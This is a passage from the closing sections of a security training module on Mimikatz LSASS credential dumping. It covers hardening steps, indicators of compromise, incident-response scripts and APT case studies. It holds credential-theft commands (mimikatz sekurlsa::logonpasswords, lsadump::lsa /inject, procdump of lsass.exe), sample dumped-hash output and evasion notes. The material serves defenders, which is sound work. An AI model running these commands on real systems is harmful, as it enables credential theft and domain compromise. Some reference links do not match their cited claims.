2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **System Protection** (or search for LSA).
3. Select **System Cryptography** → **Configure LSASS Protection**.
4. Set to: **Enabled with UEFI Lock** (strongest protection).
5. Apply GPO: `gpupdate /force` on target machines.
6. Restart systems.

**Validation Command:**
```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
# Expected output: RunAsPPL : 1 or 2
# 0 = Disabled (VULNERABLE)
# 1 = Enabled (no UEFI lock - partial mitigation)
# 2 = Enabled with UEFI lock (FULL mitigation)
```

---

#### Mitigation 2: Enable Credential Guard

**Objective:** Isolate LSASS credentials in a virtualized environment, preventing plaintext password extraction even if LSASS is dumped.

**Applies To Versions:**
- Server 2016-2019: Manual enablement required
- Server 2022: Optional (recommended)
- Server 2025: Default on enterprise-joined systems

**Requirements:**
- Virtualization extensions enabled in BIOS (Intel VT-x or AMD-V).
- UEFI Secure Boot enabled.
- SLAT (Second Level Address Translation) support.

**Manual Steps (PowerShell - Server 2016-2022):**
```powershell
# Enable Credential Guard via registry
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "LsaCfgFlags" -Value 1 -PropertyType DWord -Force
Write-Host "[+] Credential Guard enabled"

# Restart system
Restart-Computer -Force
```

**Manual Steps (Group Policy - Domain-Joined):**
1. Open **gpmc.msc**.
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Device Guard** → **Turn on Credential Guard**.
3. Set to: **Enabled with UEFI lock**.
4. Apply: `gpupdate /force`
5. Restart systems.

**Verification Command:**
```powershell
# Check if Credential Guard is enabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name Enabled
# Expected: Enabled : 1 (enabled) or 0 (disabled)

# Or use PowerShell for detailed status
Get-ComputerInfo | Select-Object DeviceGuard*
```

---

#### Mitigation 3: Disable WDigest Authentication

**Objective:** Remove plaintext passwords from LSASS memory by disabling the WDigest authentication protocol.

**Applies To Versions:** All (especially Server 2012+)
**Note:** WDigest is disabled by default on Server 2012+ but can be re-enabled maliciously; verify it's disabled.

**Manual Steps (PowerShell):**
```powershell
# Disable WDigest (set to 0)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0 -Type DWord -Force
Write-Host "[+] WDigest plaintext passwords disabled"

# Verify setting
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential
# Expected: UseLogonCredential : 0 (disabled) - SECURE
# Any other value (especially 1) = plaintext passwords in LSASS = VULNERABLE
```

**Manual Steps (Group Policy):**
1. Open **gpmc.msc**.
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Credentials Delegation** → **Allow Delegating Fresh Credentials with NTLM-only Server Authentication**.
3. Verify this is **Disabled** or **Not Configured**.
4. Also ensure **Digest Authentication** policies are disabled.
5. Apply: `gpupdate /force`

---

### Priority 2: HIGH

#### Mitigation 4: Restrict Local Administrator Accounts

**Objective:** Limit the number of users with local administrator privileges, reducing the attack surface for privilege escalation to LSASS dumping.

**Manual Steps (PowerShell):**
```powershell
# List all local administrators
Get-LocalGroupMember -Group "Administrators" | Select-Object Name, PrincipalSource

# Remove non-essential admin accounts
Remove-LocalGroupMember -Group "Administrators" -Member "DOMAIN\ServiceAccount" -Force

# Verify removal
Get-LocalGroupMember -Group "Administrators"
```

**Manual Steps (Group Policy - Domain):**
1. Open **gpmc.msc**.
2. Create a GPO: "Restrict Local Administrators".
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**.
4. Double-click **"Add members to Administrators group"**.
5. Add only: Domain Admin, Local System accounts.
6. Remove: Service accounts, standard users.
7. Apply: `gpupdate /force`

---

#### Mitigation 5: Enable Attack Surface Reduction (ASR) Rules

**Objective:** Use Microsoft Defender ASR rules to block common LSASS dumping techniques at the endpoint level.

**Applies To:** Defender for Endpoint, Microsoft Defender for Business

**Manual Steps (Microsoft Endpoint Manager - Intune):**
1. Navigate to **Microsoft Endpoint Manager** (endpoint.microsoft.com).
2. Go to **Endpoint security** → **Attack surface reduction**.
3. Click **+ Create Policy** → **Windows 10, Windows 11, and Windows Server**.
4. Name: "LSASS Credential Dumping Protection".
5. Under **Attack Surface Reduction Rules**, set the following to **Block**:
   - "Block credential stealing from the Windows local security authority subsystem (lsass.exe)" (`d1e49aac-8f56-4038-ad9b-34d7a92c1f32`)
   - "Block all Office applications from creating child processes" (if applicable)
   - "Block execution of potentially obfuscated scripts"
6. Click **Next** → **Create**.
7. Deploy to Windows 10/11/Server security groups.

**Manual Steps (Group Policy - Domain):**
1. Open **gpmc.msc**.
2. Create GPO: "ASR LSASS Protection".
3. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Defender** → **Attack Surface Reduction**.
4. Enable **"Block credential stealing from the Windows local security authority subsystem (lsass.exe)"** → Set to **Block mode** (not audit).
5. Apply: `gpupdate /force`

**Verification (PowerShell):**
```powershell
# Check ASR rule status
Get-MpPreference | Select-Object AttackSurfaceReductionRules*

# Or check via Group Policy:
gpresult /h C:\report.html  # Review report for ASR settings
```

---

### Priority 3: MEDIUM

#### Mitigation 6: Enable Restricted Admin Mode for RDP

**Objective:** Prevent credential leakage in RDP sessions, which could be leveraged for LSASS dumping via Remote Credential Guard.

**Manual Steps (Group Policy):**
1. Open **gpmc.msc**.
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Credentials Delegation** → **Restrict delegation of credentials to remote servers**.
3. Set to: **Enabled** (Only allow with Network Level Authentication).
4. Apply: `gpupdate /force`

**Manual Steps (PowerShell):**
```powershell
# Enable Restricted Admin Mode
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -Type DWord -Force
Write-Host "[+] Restricted Admin Mode enabled"

# Verify
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin"
# Expected: DisableRestrictedAdmin : 0 (enabled)
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

#### Files
- `C:\Windows\Temp\lsass.dmp` (standard ProcDump output)
- `C:\Windows\Temp\lsass_dump.dmp` (variant)
- `C:\Users\[USERNAME]\AppData\Local\Temp\lsass*.dmp` (Task Manager output)
- `C:\Windows\Temp\dumpert.dmp` (Dumpert output)
- `C:\Windows\Temp\nanodump.dmp` (NanoDump output)
- `C:\Windows\Temp\Procdump.zip` (ProcDump installer)
- `C:\Windows\Temp\Procdump\procdump64.exe` (extracted ProcDump)
- `C:\Windows\Temp\*.zip` (downloaded tools)

#### Registry
- `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 0` (PPL disabled - VULNERABLE)
- `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1` (plaintext passwords enabled)

#### Network
- **DNS Queries:** github.com, raw.githubusercontent.com (Mimikatz/tool downloads)
- **Outbound HTTP:** Port 443 to GitHub (tool downloads)
- **SMB:** Lateral movement attempts post-LSASS dump (PsExec, WMI commands)

#### Forensic Artifacts
- **Disk:** MFT entries for dump files; temporary file fragments in $Recycle.Bin.
- **Memory:** LSASS.exe process memory contains dumped credentials (captured in EDR artifacts).
- **Event Logs:**
  - Event ID 4656: Handle to LSASS requested.
  - Event ID 4663: LSASS accessed.
  - Event ID 4688: Process creation (Mimikatz, ProcDump, rundll32.exe).
  - Sysmon Event 10: ProcessAccess to LSASS.
- **Cloud (M365/Entra ID):** Unusual authentication events post-credential theft (e.g., impossible travel, new device login from different geographies).

---

### Response Procedures

#### Step 1: ISOLATE IMMEDIATELY
**Objective:** Disconnect affected system from network to prevent lateral movement.

**Command (PowerShell - Admin):**
```powershell
# Disconnect network adapter
Disable-NetAdapter -Name "Ethernet" -Confirm:$false
Write-Host "[+] Network adapter disabled - System isolated"
```

**Manual (Azure VMs):**
1. Go to **Azure Portal** → **Virtual Machines** → Select compromised VM.
2. Click **Networking** (left sidebar).
3. Select NIC → **Remove association** → **Delete** (to disconnect from VNET).
4. Alternatively: Create new NSG blocking all outbound traffic.

**Manual (On-Premises):**
1. Physically disconnect network cable.
2. Or via switch: disable port for affected device.

---

#### Step 2: COLLECT FORENSIC EVIDENCE
**Objective:** Preserve evidence before system shutdown.

**Command (PowerShell - Admin):**
```powershell
# Export Security Event Log
wevtutil epl Security "C:\Evidence\Security.evtx" /overwrite:true
wevtutil epl System "C:\Evidence\System.evtx" /overwrite:true
wevtutil epl Application "C:\Evidence\Application.evtx" /overwrite:true

# Export Sysmon logs (if installed)
wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Evidence\Sysmon.evtx" /overwrite:true

# Capture LSASS process memory (post-incident analysis)
$outputPath = "C:\Evidence\lsass_memory.dmp"
procdump -ma lsass.exe $outputPath  # Or use previous LSASS dump file

# Collect file artifacts
Copy-Item -Path "C:\Windows\Temp\lsass*.dmp" -Destination "C:\Evidence\" -ErrorAction SilentlyContinue
Copy-Item -Path "C:\Windows\Temp\dumpert.dmp" -Destination "C:\Evidence\" -ErrorAction SilentlyContinue
Copy-Item -Path "C:\Windows\Temp\nanodump.dmp" -Destination "C:\Evidence\" -ErrorAction SilentlyContinue

# Hash collected files for integrity
Get-FileHash -Path "C:\Evidence\*" | Export-Csv "C:\Evidence\FileHashes.csv"

Write-Host "[+] Evidence collected to C:\Evidence\"
```

**Manual (Event Viewer):**
1. Open **Event Viewer** → **Windows Logs** → **Security**.
2. Right-click → **Save All Events As** → `C:\Evidence\Security.evtx`.
3. Repeat for System and Application logs.

---

#### Step 3: RESET ALL COMPROMISED CREDENTIALS
**Objective:** Invalidate stolen credentials to prevent further lateral movement.

**Command (PowerShell - Domain Admin, from DC):**
```powershell
# Reset password for all Domain Admins
$adminUsers = Get-ADGroupMember -Identity "Domain Admins"
foreach ($user in $adminUsers) {
    Set-ADAccountPassword -Identity $user -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).ToString() -Force) -Reset
    Write-Host "[+] Password reset for: $($user.Name)"
}

# Invalidate Kerberos TGTs (requires domain replication)
Get-ADUser -Filter * | Set-ADUser -ChangePasswordAtNextLogon $true

# Reset krbtgt password (CRITICAL for Kerberos)
Set-ADAccountPassword -Identity "krbtgt" -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).ToString() -Force) -Reset
Write-Host "[+] krbtgt password reset - All Kerberos tickets invalidated"

# Force AD replication
repadmin /syncall /d /P
```

**Manual Steps (Active Directory Users & Computers):**
1. Open **Active Directory Users and Computers** (dsa.msc).
2. Select each compromised user account.
3. Right-click → **Reset Password** → Enter new complex password.
4. Check **User must change password at next logon**.
5. Click **OK**.

**For Service Accounts:**
```powershell
# Identify service accounts that may have been compromised
Get-ADUser -Filter {ServicePrincipalName -ne "*"} | Select-Object Name, ServicePrincipalName

# Reset their passwords and update services
$newPassword = (New-Guid).ToString()
Set-ADAccountPassword -Identity "SVC_SharePoint" -NewPassword (ConvertTo-SecureString -AsPlainText $newPassword -Force) -Reset

# Update password in service: Services → Right-click Service → Properties → Log On tab → Update password
```

---

#### Step 4: HUNT FOR PERSISTENCE MECHANISMS
**Objective:** Identify and remove backdoors, scheduled tasks, or other persistence mechanisms installed by attacker post-LSASS dump.

**Command (PowerShell):**
```powershell
# Hunt for suspicious scheduled tasks
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "NT AUTHORITY\SYSTEM" -or $_.Principal.UserId -eq "BUILTIN\Administrators"} | Select-Object TaskName, TaskPath, @{Name="CreationTime";Expression={(Get-ItemProperty -Path ("Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$($_.TaskPath -replace '\\Micros','') ...") -Name "Description" -ErrorAction SilentlyContinue).PSParentPath}} | Format-Table

# Look for suspicious registry run keys
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Select-Object -Property * | Format-List

# Check for suspicious startup programs
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Format-Table

# Look for WMI persistence
Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" | Select-Object Name, Query

# Check for suspicious services
Get-Service | Where-Object {$_.StartType -eq "Automatic" -and $_.Status -eq "Running"} | Select-Object Name, DisplayName | Format-Table
```

**Manual Steps (Task Scheduler):**
1. Open **Task Scheduler** (taskschd.msc).
2. Navigate to **Task Scheduler Library** → **Microsoft** → **Windows** (and custom folders).
3. Look for recent (post-breach date) tasks with:
   - Suspicious names (mimikatz, dump, exfil, etc.)
   - System/Admin privileges
   - Parent process: rundll32.exe, powershell.exe, cmd.exe
4. Right-click suspicious tasks → **Delete**.

---

#### Step 5: ANALYZE STOLEN CREDENTIALS
**Objective:** Determine which credentials were compromised to assess lateral movement risk.

**Command (Offline Analysis with Mimikatz):**
```cmd
REM On isolated analysis machine:
mimikatz.exe "sekurlsa::minidump C:\Evidence\lsass_memory.dmp" "sekurlsa::logonpasswords full" exit > C:\Analysis\dumped_credentials.txt

REM Or with pypykatz (Python):
pypykatz minidump C:\Evidence\lsass_memory.dmp > C:\Analysis\credentials.json
```

**Output Analysis:**
```
Authentication Id : 0 ; 61504 (0000:00010000)
Session           : Interactive
User Name         : DOMAIN\Administrator
Domain            : DOMAIN
Logon Server      : DC01
Logon Time        : 1/2/2026 6:30:00 AM
SID               : S-1-5-21-...
	msv :	
	 [00000003] Primary
	 * Username : DOMAIN\Administrator
	 * Domain   : DOMAIN
	 * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6  <-- COMPROMISED HASH
	 * SHA1     : x9y8z7a6b5c4d3e2f1g0h9i8j7k6l5m4n3

kerberos :
	 [00000000] Initial TGT
	 * Username : DOMAIN\Administrator
	 * Domain   : DOMAIN
	 * SID      : S-1-5-21-...
	 * LM       : (null)
	 * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
	 * tkt start : 1/2/2026 6:30:00 AM
	 * tkt end   : 1/3/2026 12:30:00 AM  <-- Kerberos ticket valid until this time
```

**Immediate Actions:**
1. **Mark all extracted hashes as COMPROMISED** - assume they can be cracked.
2. **Reset passwords** for all accounts found in dump.
3. **Invalidate Kerberos tickets** by resetting krbtgt (see Step 3).
4. **Hunt for lateral movement** using extracted credentials (Pass-the-Hash, Pass-the-Ticket attacks).

---

#### Step 6: ENTERPRISE-WIDE REMEDIATION
**Objective:** Apply permanent mitigations across all systems to prevent recurrence.

**Command (PowerShell - Deploy via GPO to all domain computers):**
```powershell
# Deploy LSA Protection domain-wide via GPO
# (Assumes Group Policy already configured as per Mitigations section)

# Verify deployment on sample machines
$testMachines = @("SERVER01", "SERVER02", "WORKSTATION01")
foreach ($machine in $testMachines) {
    Invoke-Command -ComputerName $machine -ScriptBlock {
        $runasppl = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -ErrorAction SilentlyContinue
        Write-Host "[$($env:COMPUTERNAME)] RunAsPPL = $($runasppl.RunAsPPL)"
    }
}
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing - Spearphishing Link | Attacker sends malicious link → compromise user workstation |
| **2** | **Execution** | [T1204.001] User Execution - Malicious Link | User clicks link → malware downloads & executes |
| **3** | **Privilege Escalation** | [T1548.002] Abuse Elevation Control Mechanism - UAC Bypass | Malware bypasses UAC → gains administrative privileges |
| **4** | **Credential Access** | **[CA-DUMP-001] Mimikatz LSASS Dumping** | **Attacker extracts cached credentials from LSASS memory** |
| **5** | **Lateral Movement** | [T1550.002] Use Alternate Authentication Material - Pass-the-Hash | Attacker uses extracted NTLM hashes to compromise domain controller |
| **6** | **Persistence** | [T1547.009] Boot or Logon Initialization Scripts - Scheduled Task/Job | Attacker creates scheduled task on DC for persistence |
| **7** | **Impact** | [T1531] Account Access Removal - Domain Wide Password Reset | Attacker resets domain passwords → locks out legitimate admins |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Sandworm Team - 2016 Ukraine Power Grid Attack

**Attacker:** Sandworm Team (Russian GRU Unit 74455)
**Target:** Ukrainian power distribution operators
**Timeline:** December 2015 - December 2016
**Technique Status:** Mimikatz used with Windows Server 2008-2012 R2 systems (no PPL protection)
**Impact:** Power outage affecting 230,000+ customers; critical infrastructure compromise

**Attack Chain:**
1. Spear-phished employees with macro-enabled Office documents.
2. Executed VBA macro → backdoored ICS systems.
3. **Dumped LSASS credentials from operational technology (OT) network systems.**
4. Used extracted domain admin credentials to compromise SCADA controllers.
5. Overwrote firmware on circuit breakers → power grid shutdown.

**Key Indicators:**
- Mimikatz process execution from unusual parent (Word.exe, Excel.exe).
- LSASS dump files in temp directories.
- Lateral movement attempts post-credential theft.

**Reference:** [Ukraine DHS ICS Alert TA14-353A](https://www.cisa.gov/publications/enhanced-mitigation-experiences-toolkit-emet-3-1)

---

### Example 2: HAFNIUM - Microsoft Exchange Compromise (2021)

**Attacker:** HAFNIUM (Chinese APT)
**Target:** Microsoft Exchange Servers (global)
**Timeline:** January - March 2021
**Technique Status:** Mimikatz + alternative tools on Server 2012/2016/2019 (varying PPL configuration)
**Impact:** 30,000+ organizations compromised; ransomware, data exfiltration, persistence

**Attack Chain:**
1. Exploited zero-day vulnerabilities in Exchange (CVE-2021-26855, CVE-2021-27065).
2. Gained SYSTEM privileges on Exchange servers.
3. **Dumped LSASS → extracted Exchange service account credentials + admin credentials.**
4. Used credentials for domain-wide compromise.
5. Deployed China Chopper webshell + ransomware families (DearCry).

**Mimikatz Usage:**
```cmd
mimikatz # sekurlsa::logonpasswords
mimikatz # token::elevate
mimikatz # lsadump::lsa /inject
```

**Detection Evasion:**
- Executed Mimikatz in-memory via PowerShell (`Invoke-Mimikatz`).
- Used procdump.exe (legitimate tool) instead of Mimikatz binary.
- Deleted dump files immediately after credential extraction.

**Reference:** [Microsoft Security Blog - HAFNIUM](https://www.microsoft.com/security/blog/2021/03/03/hafnium-targeting-exchange-servers)

---

### Example 3: APT28 (Fancy Bear) - Widespread Campaign (Ongoing)

**Attacker:** APT28 / Fancy Bear (Russian GRU)
**Targets:** Government, Defense, Energy sectors (NATO countries)
**Timeline:** 2016-Present (ongoing as of 2026)
**Technique Status:** Mimikatz + ProcDump on Server 2016/2019 with varying PPL configurations
**Impact:** Long-term espionage, theft of classified defense secrets

**Operational Pattern:**
1. Initial compromise via spear-phishing or watering hole attacks.
2. Move to domain controller via lateral movement.
3. **Execute Mimikatz on DC → extract all domain credentials + Kerberos tickets.**
4. Use Golden Ticket attacks (fake Kerberos TGTs) for persistent access.
5. Data exfiltration via covert channels.

**Observed Tools:**
- Mimikatz (custom, obfuscated variants)
- ProcDump for dump generation
- Custom credential theft scripts

**Defender Response:**
- EDR detected LSASS access patterns and alerted US Cybersecurity & Infrastructure Security Agency (CISA).
- Victims forced to reset all domain credentials.
- Kerberos tickets revoked domain-wide.

**Reference:** [CISA Advisory on APT28](https://www.cisa.gov/news-events/cybersecurity-advisories)

---

**END OF MODULE CA-DUMP-001**

---

## Summary

This comprehensive module provides Red Teams with detailed execution methods, evasion techniques, and post-exploitation strategies for Mimikatz LSASS credential dumping. Blue Teams have specific detection rules (Splunk, Sentinel, Sysmon, Windows Event Log), forensic procedures, and hardening mitigations to defend against this critical attack.

**Key Takeaway:** LSASS credential dumping remains one of the most impactful attack techniques in Windows environments. A single successful dump can lead to organization-wide compromise. Layered defenses (LSA Protection + Credential Guard + Attack Surface Reduction + continuous monitoring) are essential to prevent this attack.